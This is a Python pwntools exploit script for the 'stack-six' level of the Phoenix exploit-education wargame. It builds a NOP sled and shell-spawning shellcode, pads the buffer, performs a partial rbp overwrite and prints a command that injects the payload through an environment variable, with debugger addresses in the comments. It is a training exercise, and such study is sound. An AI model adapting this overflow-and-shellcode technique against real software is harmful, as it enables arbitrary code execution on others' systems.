#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/amd64/stack-six"
context.binary = path

payload = b"\x90" * 20 + asm(shellcraft.sh())  # 44 bytes
payload += (126 - len(payload)) * b"a"
# payload += b"\xb8"  # partial rbp overwrite
# payload += b"\xe0"  # partial rbp overwrite
payload += b"\x40"  # partial rbp overwrite
with open("payload", "wb") as f:
    f.write(payload)

# TODO: find robust exploit for stack-six / auto-adapt to different envs
print("This exploit is sensitive to env vars and will not work")
print("if you're not under ~/phoenix/stack6 and VSC remote SSH.")
print("Run the following:")
print("ExploitEducation=$(cat payload) /opt/phoenix/amd64/stack-six")
# io = process(path, env={"ExploitEducation": payload})
# io.interactive()

# bps
# 0x000000000040077d <+128>:   call   0x400550 <strncpy@plt>
# 0x00000000004007f6 <+91>:    leave

# grep ExploitEducation
# 0x7fffffffec3d - 0x7fffffffec4d  →   "ExploitEducation=[...]"
# 0x00007fffffffdee8│+0x00e8: 0x00007fffffffec4e  →  0x9090909090909090

# buffer shellcode start = 0x00007fffffffde42

# overwritten: 0x00007fffffffde61

# env = 0x00007FFFFFFFEBA1  # returned from getenv
